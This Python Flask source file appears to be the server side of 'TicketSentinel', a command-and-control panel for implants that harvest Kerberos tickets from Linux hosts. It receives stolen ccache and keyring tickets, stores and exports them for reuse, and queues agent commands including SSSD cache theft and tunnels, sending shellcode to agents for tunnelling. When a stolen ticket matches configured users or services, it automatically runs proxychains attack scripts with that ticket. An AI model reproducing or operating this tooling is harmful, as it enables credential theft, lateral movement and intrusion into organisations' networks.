from flask import Flask, render_template, request, Response, session, redirect, url_for, jsonify


import sqlite3
import base64
import json
import datetime
import struct
import threading
import time
import subprocess
import uuid as uuid_module

from impacket.krb5.ccache import CCache
from impacket.krb5.asn1 import TGS_REP
from pyasn1.codec.der import decoder
from collections import Counter
from fnmatch import fnmatch
from functools import wraps

app = Flask("TicketSentinel")
app.secret_key = "AdeptsOf0xCC-Modify_me_pls"

command_list = {
        "ccache_watcher_change" : 1,
        "keyring_watcher_change" : 2,
        "sssd_ccache" : 11,
        "open_tunnel" : 12,
        "close_tunnel" : 13,
        "status_tunnel" : 14,
        "update_sleep" : 21,
        }

reverse_command_list = {v: k for k, v in command_list.items()}

# Load Config
with open("config.json", "r", encoding="utf-8") as f:
    config = json.load(f)

# Internal functions

## Returns basic data of every ticket in the database
def describe_tickets():
    tickets = []
    c = conn.cursor()
    for hit in c.execute('''SELECT * FROM tickets ORDER BY id DESC'''):
        ticket = base64.b64decode(hit["ticket_b64"])
        ticket_host = hit["ticket_host"]
        ticket_id = hit["id"]
        ccache = CCache(data=ticket)

        for creds in ccache.credentials:
            ticket_data = {}
            rawTicket = creds.toTGS()
            decodedTicket = decoder.decode(rawTicket['KDC_REP'], asn1Spec=TGS_REP())[0]
            ticket_data["user_name"] = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
            ticket_data["use_realm"] = creds['client'].prettyPrint().split(b'@')[1].decode('utf-8')
            ticket_data["spn"] = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')
            ticket_data["service_realm"] = creds['server'].prettyPrint().split(b'@')[1].decode('utf-8')
            ticket_data["start_time"] = creds['time']['starttime']
            ticket_data["start_time_format"] = datetime.datetime.fromtimestamp(creds['time']['starttime']).strftime("%d/%m/%Y %H:%M:%S %p")
            ticket_data["end_time"] = creds['time']['endtime']
            ticket_data["end_time_format"] = datetime.datetime.fromtimestamp(creds['time']['endtime']).strftime("%d/%m/%Y %H:%M:%S %p")
            ticket_data["life_time"] = ticket_data["end_time"] - ticket_data["start_time"]
            ticket_data["life_time_format"] = str(ticket_data["life_time"] / 3600) + " Hours"
            ticket_data["renew_till"] = creds['time']['renew_till']
            if datetime.datetime.fromtimestamp(creds['time']['endtime']) < datetime.datetime.now():
                ticket_data["status"] = "Expired"
            else:
                ticket_data["status"] = datetime.datetime.fromtimestamp(creds['time']['endtime']) - datetime.datetime.now()
            
            ticket_data["host"] = ticket_host
            ticket_data["id"] = ticket_id
            tickets.append(ticket_data)
    
    return tickets

def create_ticket_stats(tickets):
    ticket_stats = {}
    ticket_stats["total_tickets"] = len(tickets)
    ticket_stats['expired_tickets'] = sum(1 for t in tickets if t.get('status') == 'Expired')
    ticket_stats['total_hosts'] = len({t.get('host') for t in tickets if t.get('host')})
    ticket_stats['total_users'] = len({t.get('user_name') for t in tickets if t.get('user_name')})
    ticket_stats['total_users'] = len({t.get('user_name') for t in tickets if t.get('user_name')})
    user_counter = Counter(t.get('user_name') for t in tickets if t.get('user_name'))
    ticket_stats['users'] = list(user_counter.items())
    hours_counter = {hour: 0 for hour in range(24)}
    for t in tickets:
        ts = t.get('start_time')
        if ts:
            hour = datetime.datetime.fromtimestamp(ts).hour
            hours_counter[hour] += 1
    ticket_stats['hours'] = hours_counter
    return ticket_stats

def build_attack(payload, ticket):
    command = ["proxychains", "python3", payload["command"]]
    for key, value in payload["args"].items():
        command.append("-" + key)
        command.append(value)
    command.append("-ticket")
    command.append(ticket)
    return command

def attack_worker(attack_id, payload, ticket, agent_id):
    command_uid = add_command_input(agent_id, "open_tunnel", "")
    while True:
        time.sleep(5)
        conn2 = sqlite3.connect(config["database"], timeout=10)
        conn2.row_factory = sqlite3.Row
        c2 = conn2.cursor()
        hit = c2.execute('''SELECT status FROM commands WHERE command_guid = ?''', (command_uid,)).fetchone()
        if hit["status"] == 2:
            attack = build_attack(payload, ticket)
            result = subprocess.run(attack, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            output = "[+] Executed attack on: " + agent_id + "\n[+] Command: " + ' '.join(attack) + "\n\n" + result.stdout
            while True:
                try:
                    c2.execute('''
                        UPDATE attacks SET output = ?, status = 2, timestamp_out = ? WHERE attack_guid = ?
                    ''', (output, int(time.time()), attack_id)
                    )
                    conn2.commit()
                except sqlite3.OperationalError as e:
                    if "locked" in str(e):
                        time.sleep(5)
                        continue
                break
            add_command_input(agent_id, "close_tunnel", "")
            conn2.close()
            break
    return

def attack(username, spn, ticket, agent_id):
    hits = c.execute('''SELECT * from attacks WHERE status = 0''').fetchall()
    if hits != None:
        for hit in hits:
            payload = json.loads(hit["payload"])
            attack_id = hit["attack_guid"]
            if fnmatch(username, payload["username_condition"]) and fnmatch(spn, payload["spn_condition"]):
                ticket_id = str(uuid_module.uuid4())
                ticket_name = "/tmp/" + ticket_id + ".ccache"
                file = open(ticket_name, "wb")
                file.write(ticket)
                file.close()
                c.execute('''UPDATE attacks SET status = 1 WHERE attack_guid = ?''', (attack_id,))
                conn.commit()
                worker = threading.Thread(target=attack_worker, args=(attack_id, payload, ticket_name, agent_id))
                worker.daemon = True
                worker.start()
                return            
    return 
    
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if "user_id" not in session:
            return redirect(url_for("login", next=request.url))
        return f(*args, **kwargs)
    return decorated_function


# Routers
@app.route("/")
@login_required
def index_page():
    tickets = describe_tickets()
    ticket_stats = create_ticket_stats(tickets)
    return render_template("index.html", tickets=ticket_stats)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username == config["web_username"] and password == config["web_password"]:
            session["user_id"] = username
            next_page = request.args.get("next")
            return redirect(next_page or url_for("index_page"))
        else:
            return render_template("login.html", error="Invalid credentials")

    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/attacks")
@login_required
def attacks_page():
    with open("./attack_templates/attacks.json", "r") as file:
        attacks = json.load(file)
    sc_attacks = []
    c = conn.cursor()
    for hit in c.execute('''SELECT * FROM attacks ORDER BY id DESC'''):
        attack_data = {}
        payload = json.loads(hit["payload"])
        attack_data["guid"] = hit["attack_guid"]
        attack_data["status"] = hit["status"]
        attack_data["t_in"] = datetime.datetime.fromtimestamp(hit["timestamp_in"]).strftime("%d/%m/%Y %H:%M:%S %p")
        if hit["timestamp_out"] > 0:
            attack_data["t_out"] = datetime.datetime.fromtimestamp(hit["timestamp_out"]).strftime("%d/%m/%Y %H:%M:%S %p")
        else:
            attack_data["t_out"] = "-"
        attack_data["payload"] = payload
        attack_data["output"] = hit["output"]
        attack_data["username_condition"] = payload.get("username_condition", "")
        attack_data["spn_condition"] = payload.get("spn_condition", "")
        attack_data["command"] = payload.get("command", "")
        sc_attacks.append(attack_data)
        
    return render_template("attacks.html", attacks=attacks, sc_attacks=sc_attacks)

@app.route("/register-attack", methods=["POST"])
@login_required
def register_attack():
    attack_guid = str(uuid_module.uuid4())
    attack_data = request.get_json()
    c = conn.cursor()
    c.execute('''
        INSERT INTO attacks(attack_guid, status, timestamp_in, timestamp_out, payload, output) VALUES (?,?,?,?,?,?)
    ''', (attack_guid, 0, int(time.time()), 0, json.dumps(attack_data), "WAITING"))
    conn.commit()
    return '{"Status" : "OK"}'

@app.route("/tickets")
@login_required
def tickets():
    tickets = describe_tickets()
    return render_template("tickets.html", tickets=tickets)


@app.route("/search/<term>")
@login_required
def search(term):
    tickets = describe_tickets()
    filtered = []
    for t in tickets:
        status = t.get("status")
        if status == "Expired":
            continue

        if not (
            term in t.get("user_name", "").lower()
            or term in t.get("spn", "").lower()
        ):
            continue

        if isinstance(status, datetime.timedelta):
            t["status"] = str(status)  
        filtered.append(t)

    return jsonify(filtered)

@app.route("/ingest/<uuid>/<hostname>/<filename>", methods = ["POST"])
def ingest_ticket(hostname, filename, uuid):
    if request.method == "POST":
        krb5file = filename
        ticket = request.files['ticket'].read()
        ticket_base64 = base64.b64encode(ticket)
        c = conn.cursor()
        c.execute('''
            INSERT INTO tickets(ticket_b64, ticket_host, ticket_filename) VALUES (?, ?, ?)
            ''', 
            (ticket_base64, hostname, krb5file)
        )
        conn.commit()
    ccache = CCache(data=ticket)
    for creds in ccache.credentials:
        username = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
        spn = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')
        attack(username, spn, ticket, uuid)
        return ping(uuid)

@app.route("/ticket/info/<ticketid>")
@login_required
def ticket_info(ticketid):
    c = conn.cursor()
    hit = c.execute('''SELECT * from tickets WHERE id=?''', (ticketid,)).fetchone()
    if hit is None:
        return "Ticket not found", 404
    else:
        return render_template("ticketinfo.html", ticket=hit["ticket_b64"], ticket_id=ticketid, file=hit["ticket_filename"], host=hit["ticket_host"])

@app.route("/download/ticket/<ticket_id>/<ticket_format>")
@login_required
def ticket_download(ticket_id, ticket_format):
    c = conn.cursor()
    hit = c.execute('''SELECT * from tickets WHERE id=?''', (ticket_id,)).fetchone()
    if hit is None:
        return "Ticket not found", 404
    else:
        ticket_bytes = base64.b64decode(hit["ticket_b64"])
        if ticket_format == "kirbi":
            ccache = CCache(data=ticket_bytes)
            ticket_bytes = ccache.toKRBCRED()
        filename = f"ticket-{ticket_id}.{ticket_format}"
        mimetype = "application/octet-stream"
        return Response(ticket_bytes, mimetype=mimetype, headers={"Content-Disposition": f'attachment; filename="{filename}"'})

@app.route("/ping/<uuid>")
def ping(uuid):
    c = conn.cursor()
    c.execute('''
        UPDATE agents SET last_seen = ? WHERE guid = ?
    ''', (int(time.time()), uuid))
    hits = c.execute('''SELECT * from commands WHERE agent_guid=? AND status = 0''', (uuid,)).fetchall()
    commands = []
    if hits != None:
        for hit in hits:
            command_guid = uuid_module.UUID(hit["command_guid"]).bytes
            c.execute('''UPDATE commands SET status = 1 WHERE command_guid = ?''', (hit["command_guid"],))
            conn.commit()
            if reverse_command_list[hit["command_input"]] == "open_tunnel":
                with open(config["tunnel_shellcode"], "rb") as file:
                    arg_bytes = file.read()
            else:
                arg = hit["command_args"] or ""
                arg_bytes = arg.encode("utf-8")
            commands.append((command_guid, hit["command_input"], arg_bytes))
    buffer = bytearray()
    buffer += struct.pack("!I", len(commands))
    for guid, command, arg_bytes in commands:
        buffer += guid
        buffer += struct.pack("!I", command)
        buffer += struct.pack("!I", len(arg_bytes))
        buffer += arg_bytes
    return bytes(buffer)

@app.route("/status")
@login_required
def agent_status():
    agents = []
    c = conn.cursor()
    for hit in c.execute('''SELECT * FROM agents ORDER BY id DESC'''):
        agent_data = {}
        agent_data["guid"] = hit["guid"]
        agent_data["first_seen"] = datetime.datetime.fromtimestamp(hit["first_seen"]).strftime("%d/%m/%Y %H:%M:%S %p")
        agent_data["last_seen"] = datetime.datetime.fromtimestamp(hit["last_seen"]).strftime("%d/%m/%Y %H:%M:%S %p")
        agent_data["host"] = hit["host"]
        agent_data["sleep"] = hit["sleep"]
        if int(time.time()) > (hit["last_seen"] + int(hit["sleep"])):
            agent_data["status"] = "🔴"
        else:
            agent_data["status"] = "🟢"
        agents.append(agent_data)
    return render_template("agents.html", agents=agents)

@app.route("/agent/show/<uuid>")
@login_required
def agent_show(uuid):
    agent = {}
    agent["uuid"] = uuid
    c = conn.cursor()
    hit = c.execute('''SELECT * from agents WHERE guid=?''', (uuid,)).fetchone()
    if hit is None:
        return "Agent not found", 404
    else:
        lines = hit["krb5"].decode("utf-8").split("\n")
        agent["ccache"] = "File"
        for line in lines:
            if "default_realm" in line:
                agent["default_realm"] = line.split(" ")[2]
            if "cache_credentials" in line:
                agent["sssd_cache"] = line.split(" ")[2]
            if "KEYRING" in line:
                agent["ccache"] = "Keyring"
            if "KCM" in line:
                agent["ccache"] = "KCM"
            if "domains =" in line:
                agent["domains"] =  line.split("=")[1]
    return render_template("agent_show.html", agent=agent)


@app.route("/register/<uuid>/<hostname>/<tsleep>", methods = ["POST"])
def register_agent(uuid, hostname, tsleep):
    if request.method == "POST":
        data = request.files['data'].read()
        ts = int(time.time())
        c.execute('''
            INSERT INTO agents(guid, host, last_seen, first_seen, sleep, ccache_watch, keyring_watch, krb5) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''',
            (uuid, hostname, ts, ts, int(tsleep), int(0), int(0), data)
        )
        conn.commit()
        return "OK"
    
@app.route("/watcher/status/<uuid>/<watch_id>")
def watcher_status(uuid, watch_id):
    c = conn.cursor()
    hit = c.execute('''SELECT ccache_watch,keyring_watch from agents WHERE guid=?''', (uuid,)).fetchone()
    if watch_id == "ccache":
        return '{"state":' + str(hit["ccache_watch"]) + '}'
    if watch_id == "keyring":
        return '{"state":' + str(hit["keyring_watch"]) + '}'

@app.route("/watcher/toggle/<uuid>/<watch_id>")
def watcher_toggle(uuid, watch_id):
    c = conn.cursor()
    command = ""
    if "ccache" == watch_id:
        command = command_list["ccache_watcher_change"]
        c.execute('''
            UPDATE agents SET ccache_watch = ? WHERE guid = ?
            ''' , (1, uuid)
            )
    if "keyring" == watch_id:
        command = command_list["keyring_watcher_change"]
        c.execute('''
            UPDATE agents SET keyring_watch = ? WHERE guid = ?
            ''' , (1, uuid)
            )
    command_uuid = str(uuid_module.uuid4())
    c.execute('''
        INSERT INTO commands(command_guid, agent_guid, command_input, command_output, status, timestamp, command_args) VALUES (?, ?, ?, ?, ?, ?, ?)
    ''',(command_uuid, uuid, command, "WAITING", 0, int(time.time()),""))
    conn.commit()
    return "OK"

@app.route("/commands/<uuid>")
@login_required
def command_show(uuid):
    commands = []
    c = conn.cursor()
    hits = c.execute('''SELECT * from commands WHERE agent_guid=? ORDER BY id DESC''', (uuid,)).fetchall()
    if hits != None:
        for hit in hits:
            command_data = {}
            command_data["timestamp"] = datetime.datetime.fromtimestamp(hit["timestamp"]).strftime("%d/%m/%Y %H:%M:%S %p")
            command_data["command_guid"] = hit["command_guid"]
            command_data["command_input"] = reverse_command_list[hit["command_input"]]
            command_data["command_args"] = hit["command_args"]
            command_data["command_output"] = hit["command_output"]
            if hit["status"] == 0:
                command_data["status"] = "Not read"
            elif hit["status"] == 1:
                command_data["status"] = "Processing"
            else:
                command_data["status"] = "Executed"
            commands.append(command_data)
    hit = c.execute('''SELECT * from agents WHERE guid = ?''', (uuid,)).fetchone()
    return render_template("command_show.html", commands=commands, agent=uuid, host=hit["host"])

@app.route("/commands/add/<uuid_agent>/<command_input>/<command_args>")
@login_required
def add_command_input(uuid_agent, command_input, command_args):
    command = command_list[command_input]
    command_uuid = str(uuid_module.uuid4())
    c = conn.cursor()
    c.execute('''
        INSERT INTO commands(command_guid, agent_guid, command_input, command_output, status, timestamp, command_args) VALUES (?, ?, ?, ?, ?, ?, ?)
    ''',(command_uuid, uuid_agent, command, "WAITING", 0, int(time.time()),command_args))
    conn.commit()
    if command_input == "update_sleep":
        c.execute('''
            UPDATE agents SET sleep = ? WHERE guid = ?
        ''', (int(command_args), uuid_agent)
        )
    return command_uuid

@app.route("/commands/watcher/<uuid_command>/<params>", methods = ["POST"])
def add_output_watcher(uuid_command, params):
    if request.method == "POST":
        output = request.files['data'].read()
        c = conn.cursor()
        hit = c.execute('''SELECT * from commands WHERE command_guid = ?''', (uuid_command,)).fetchone()
        if hit["command_input"] == 1:
            c.execute('''
                UPDATE agents SET ccache_watch = ? WHERE guid = ?
            ''', (int(params), hit["agent_guid"])
            )

            c.execute('''
                UPDATE commands SET command_output = ?, status = 2 WHERE command_guid = ?
            ''', (output.decode("utf-8"), uuid_command)
            )
            conn.commit()
    if hit["command_input"] == 2:
            c.execute('''
                UPDATE agents SET keyring_watch = ? WHERE guid = ?
            ''', (int(params), hit["agent_guid"])
            )

            c.execute('''
                UPDATE commands SET command_output = ?, status = 2 WHERE command_guid = ?
            ''', (output.decode("utf-8"), uuid_command)
            )
            conn.commit()
    return "OK"

@app.route("/commands/output/<uuid_command>", methods = ["POST"])
def add_output_command(uuid_command):
    if request.method == "POST":
        output = request.files['data'].read()
        c = conn.cursor()
        c.execute('''
            UPDATE commands SET command_output = ?, status = 2 WHERE command_guid = ?
        ''', (output.decode("utf-8"), uuid_command)
        )
        conn.commit()          
    return "OK"

# Main
try:
    conn = sqlite3.connect(config["database"], check_same_thread=False, timeout=10)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.executescript('''
        CREATE TABLE IF NOT EXISTS tickets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ticket_b64,
            ticket_host,
            ticket_filename
        );

        CREATE TABLE IF NOT EXISTS agents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            guid,
            host,
            last_seen,
            first_seen,
            sleep,
            ccache_watch,
            keyring_watch,
            krb5
        );

        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_guid,
            agent_guid,
            command_input,
            command_output,
            status,
            timestamp,
            command_args
        );

        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            attack_guid,
            status,
            timestamp_in,
            timestamp_out,
            payload,
            output
        );
    ''')

except Exception as e:
    print(str(e))
    print("[!] Error: could not create or connect to database!\n")
    exit(-1)




if __name__ == "__main__":
    app.run(debug=False, port=config["port"], host=config["host"])
